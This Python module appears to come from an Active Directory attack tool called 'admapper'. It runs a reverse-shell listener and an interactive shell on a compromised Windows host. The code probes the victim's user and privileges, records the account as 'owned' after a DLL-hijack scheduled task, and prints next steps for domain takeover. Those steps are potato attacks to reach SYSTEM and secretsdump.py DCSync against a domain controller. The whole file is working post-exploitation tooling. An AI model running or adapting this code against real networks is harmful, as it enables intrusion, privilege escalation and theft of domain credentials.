from __future__ import annotations

import json
import re
import shlex
import subprocess
import sys
import threading
from typing import TYPE_CHECKING

from admapper.postex.listener import ReverseShellListener
from admapper.postex.listener_marker import (
    is_port_in_use,
    read_listener_marker,
    write_listener_marker,
)
from admapper.support.output import print_error, print_info, print_success, print_warning

if TYPE_CHECKING:
    from admapper.support.session import Session


def parse_shell_username(probe_output: str) -> str:
    """Extract DOMAIN\\user or user from reverse-shell probe / whoami output."""
    for line in probe_output.splitlines():
        stripped = line.strip()
        if not stripped or "whoami" in stripped.lower():
            continue
        exact = re.search(r"^([\w.-]+\\[\w$.-]+)\s*$", stripped, re.I)
        if exact:
            return exact.group(1).split("\\")[-1]
        inline = re.search(r"\b([\w.-]+\\[\w$.-]+)\b", stripped, re.I)
        if inline:
            return inline.group(1).split("\\")[-1]
    return ""


_ACTIVE_LISTENERS: dict[tuple[str, int], ReverseShellListener] = {}


def register_active_listener(workspace: str, port: int, listener: ReverseShellListener) -> None:
    _ACTIVE_LISTENERS[(workspace.lower(), port)] = listener


def unregister_active_listener(workspace: str, port: int) -> None:
    _ACTIVE_LISTENERS.pop((workspace.lower(), port), None)


def get_active_listener(workspace: str, port: int) -> ReverseShellListener | None:
    return _ACTIVE_LISTENERS.get((workspace.lower(), port))


class ReverseShellRepl:
    """Interactive REPL over an existing reverse shell connection.

    The listener is kept alive, commands are sent raw and output returned.
    Supports re-scanning from the shell context by spawning targeted admapper
    commands locally with the captured username marked as owned.
    """

    def __init__(
        self,
        listener: ReverseShellListener,
        session: Session,
        *,
        lhost: str = "",
        lport: int = 4444,
        prompt_user: str = "shell",
        op_id: str | None = None,
        expected_user: str | None = None,
        auto_chain: bool | None = None,
    ) -> None:
        self.listener = listener
        self.session = session
        self.lhost = lhost
        self.lport = lport
        self.prompt_user = prompt_user
        self.op_id = op_id
        self.expected_user = expected_user
        self.auto_chain = auto_chain
        self._stop = threading.Event()
        self._post_connect_done = False

    def _read_stdin(self) -> None:
        """Reads stdin in a background thread so socket select loop is not blocked."""
        while not self._stop.is_set():
            try:
                line = sys.stdin.readline()
            except KeyboardInterrupt:
                break
            if not line:
                break
            cmd = line.rstrip("\n")
            if not cmd.strip():
                continue
            if cmd.strip().lower() == "exit":
                self._stop.set()
                break
            try:
                self.listener.send_raw(cmd)
            except RuntimeError as exc:
                print_warning(str(exc))
                self._stop.set()
                break
        if not self._stop.is_set():
            self._stop.set()

    def interact(self, *, skip_post_connect: bool = False) -> None:
        """Spawn a raw pseudoterminal-like loop over the TCP reverse shell."""
        if not self.listener.capture.connected or not self.listener._conn:
            raise RuntimeError("no active reverse shell")

        if not skip_post_connect and not self._post_connect_done:
            self.post_connect_check()
            self._post_connect_done = True

        print_success(f"interactive shell on {self.listener.capture.peer}")
        print_info("type 'exit' to leave, 'admapper <cmd>' to run local scan using this context")
        sys.stdout.write("\n")
        sys.stdout.flush()

        # Post-connect marker probes are done — switch to raw send + single recv loop.
        self.listener.begin_interact()

        stdin_thread = threading.Thread(target=self._read_stdin, daemon=True)
        stdin_thread.start()

        conn = self.listener._conn
        try:
            conn.settimeout(None)
            while not self._stop.is_set():
                try:
                    data = conn.recv(4096)
                except OSError:
                    break
                if not data:
                    break
                sys.stdout.write(data.decode("utf-8", errors="replace"))
                sys.stdout.flush()
        except KeyboardInterrupt:
            pass
        finally:
            self._stop.set()
            self.listener.end_interact()
            try:
                conn.settimeout(5.0)
            except OSError:
                pass
            if self.listener.persistent:
                self.listener.release_session()

        print_info("reverse shell session ended")

    def post_connect_check(self) -> str:
        """Identify shell user, mark owned, check privs, emit next steps."""
        from admapper.creds.common import pick_dc_ip
        from admapper.escalate.analyze import mark_user_owned, record_escalation_step
        from admapper.postex.pe_arch import parse_privilege_output

        username = ""
        try:
            whoami_out = self.run_once("whoami", timeout=8.0)
            username = parse_shell_username(whoami_out) or self._parse_plain_user(whoami_out)
        except RuntimeError:
            whoami_out = self.listener.capture.output
            username = parse_shell_username(whoami_out)

        if not username and self.expected_user:
            username = self.expected_user.split("\\")[-1]

        if not username or username == "unknown":
            print_warning("could not identify shell user from whoami")
            return ""

        workspace = self.session.workspace.name if self.session.workspace else ""
        domain = (self.session.workspace.domain if self.session.workspace else "") or ""

        if self.session.workspace:
            try:
                mark_user_owned(self.session, username, refresh=True)
                record_escalation_step(
                    self.session,
                    action="dll_hijack_shell",
                    detail=(
                        "shell via DLL hijack scheduled task → "
                        f"{domain}\\{username}" if domain else username
                    ),
                )
                self.session.persist_workspace()
            except (ValueError, RuntimeError) as exc:
                print_warning(f"mark owned: {exc}")

            ws_path = self.session.workspaces.path_for(workspace)
            if (ws_path / "ops_progress.json").is_file():
                print_success(
                    f"graph.json updated — refresh dashboard to see {username} as owned"
                )

            if self.auto_chain:
                try:
                    from admapper.engage.auto import finalize_postex_shell

                    finalize_postex_shell(
                        self.session,
                        username=username,
                        probe_output=self.listener.capture.output,
                        auto_chain=True,
                    )
                except Exception as exc:
                    print_warning(f"auto chain: {exc}")

        privs_out = ""
        try:
            privs_out = self.run_once("whoami /priv", timeout=8.0)
        except RuntimeError:
            pass

        priv_set = parse_privilege_output(privs_out)
        is_system = "system" in username.lower() or "nt authority\\system" in privs_out.lower()
        if is_system:
            print_success("already SYSTEM — run DCSync directly")
        elif "SeImpersonatePrivilege" in priv_set or "SeAssignPrimaryTokenPrivilege" in priv_set:
            print_success("SeImpersonatePrivilege detected — potato attack available")
            print_info("next: GodPotato / PrintSpoofer / JuicyPotatoNG → SYSTEM")
            print_info("then: secretsdump.py SYSTEM → DCSync")

        dc_ip = pick_dc_ip(self.session) if self.session.workspace else ""
        domain = (self.session.workspace.domain if self.session.workspace else "") or "DOMAIN"
        print_info("next admapper commands:")
        if workspace:
            wsus_path = self.session.workspaces.path_for(workspace) / "wsus_ops.json"
            if wsus_path.is_file():
                try:
                    import json

                    data = json.loads(wsus_path.read_text(encoding="utf-8"))
                    for item in data.get("opportunities") or []:
                        if str(item.get("id")) == "wsus-004" and item.get("ready"):
                            print_info(
                                f"    admapper postex wsus run -w {workspace}  "
                                "(WSUS cert chain)"
                            )
                            break
                except (OSError, json.JSONDecodeError):
                    pass
        print_info(
            f"    secretsdump needs hash/ticket — reverse shell alone has no password for "
            f"{domain}/{username}"
        )
        if dc_ip:
            print_info(
                f"    from SYSTEM shell: secretsdump.py -just-dc {domain}/user@{dc_ip}"
            )
        return username

    @staticmethod
    def _parse_plain_user(text: str) -> str:
        for line in text.splitlines():
            stripped = line.strip()
            if "\\" in stripped:
                return stripped.split("\\")[-1]
            if stripped and stripped.lower() not in ("whoami",):
                return stripped
        return ""


    def run_once(self, command: str, *, timeout: float = 15.0) -> str:
        """Execute one command and return its clean output."""
        return self.listener.send(command, timeout=timeout)

    def _persist_workspace_user(self, username: str) -> None:
        """Mark the captured account as owned so admapper re-uses it for scans."""
        if not self.session.workspace:
            return
        from admapper.escalate.analyze import mark_user_owned, record_escalation_step

        if username and username not in self.session.workspace.owned_users:
            mark_user_owned(self.session, username, refresh=False)
            record_escalation_step(
                self.session,
                action="reverse_shell_user",
                detail=f"postex shell → {username}",
            )
            self.session.persist_workspace()
            print_success(f"marked owned: {username}")

    def run_local_scan(self, *admapper_args: str) -> None:
        """Run a local admapper command with the shell user as pivot context."""
        if not self.session.workspace:
            print_error("no active workspace")
            return
        username = self._guess_username()
        if username:
            self._persist_workspace_user(username)
        args = ["admapper", *admapper_args]
        print_info(f"running: {' '.join(shlex.quote(str(a)) for a in args)}")
        subprocess.run(args, check=False)

    def _guess_username(self) -> str:
        """Try to resolve current user over the shell."""
        try:
            out = self.run_once("whoami", timeout=5.0)
        except RuntimeError:
            return ""
        for line in out.splitlines():
            stripped = line.strip()
            if "\\" in stripped:
                return stripped.split("\\")[-1]
            if stripped and stripped.lower() not in ("whoami",):
                return stripped
        return ""


def _listener_conflict_message(marker: dict, lport: int) -> str:
    op_id = marker.get("op_id") or "?"
    if marker.get("connected"):
        peer = marker.get("peer") or "unknown"
        return (
            f"reverse shell already captured on port {lport} from {peer} "
            f"(op {op_id}) — use the terminal running postex run, not a second listener"
        )
    return (
        f"listener already active on port {lport} from postex run (op {op_id}) — "
        "wait for the callback in that terminal instead of starting postex shell"
    )


def load_or_start_listener(
    session: Session,
    *,
    lport: int = 4444,
    keep_alive: bool = True,
) -> ReverseShellListener:
    """Return a live in-process listener or start a fresh one.

    Reuses the listener registered by ``postex run`` in the same process.
    Refuses to double-bind when ``listener.json`` shows an active listener on
    the same port in another process.
    """
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    workspace = session.workspace.name
    existing = get_active_listener(workspace, lport)
    if existing is not None:
        if existing.capture.connected or (
            existing._thread is not None and existing._thread.is_alive()
        ):
            return existing

    marker = read_listener_marker(session)
    if marker and int(marker.get("port", 0)) == lport and is_port_in_use(lport):
        raise RuntimeError(_listener_conflict_message(marker, lport))

    listener = ReverseShellListener(lport, keep_alive=keep_alive)
    listener.start()
    register_active_listener(workspace, lport, listener)
    write_listener_marker(
        session,
        port=lport,
        op_id=str(marker.get("op_id") or "") if marker else "",
        connected=False,
    )
    return listener


def connect_shell(
    session: Session,
    *,
    lport: int = 4444,
    command: str | None = None,
) -> None:
    """CLI entry point for ``admapper postex shell ...``.

    Reuses an in-process listener from ``postex run`` when available.
    Otherwise starts a fresh listener unless ``listener.json`` indicates
    another process already owns the port.
    """
    marker = read_listener_marker(session)
    if marker and int(marker.get("port", 0)) == lport:
        if marker.get("connected"):
            print_info(
                f"listener marker shows shell connected from {marker.get('peer') or 'unknown'}"
            )
        elif is_port_in_use(lport):
            print_warning(_listener_conflict_message(marker, lport))
            return

    try:
        listener = load_or_start_listener(session, lport=lport, keep_alive=True)
    except RuntimeError as exc:
        print_error(str(exc))
        return

    if listener.capture.connected:
        print_success(f"reusing active reverse shell on {listener.capture.peer}")
    elif not listener.capture.connected:
        print_info(f"waiting for reverse shell on port {lport} ...")
        listener.wait(timeout=30.0)
    if not listener.capture.connected:
        print_warning(
            "no shell connected yet — ensure the payload is running and retry after the callback"
        )
        if marker:
            print_info(
                "tip: the scheduled task may need to be triggered again; "
                "connect via WinRM and run: schtasks /run /tn '<task_name>'"
            )
        return

    repl = ReverseShellRepl(listener, session, lport=lport)
    if command:
        repl.post_connect_check()
        output = repl.run_once(command)
        print(output)
        return
    repl.interact()
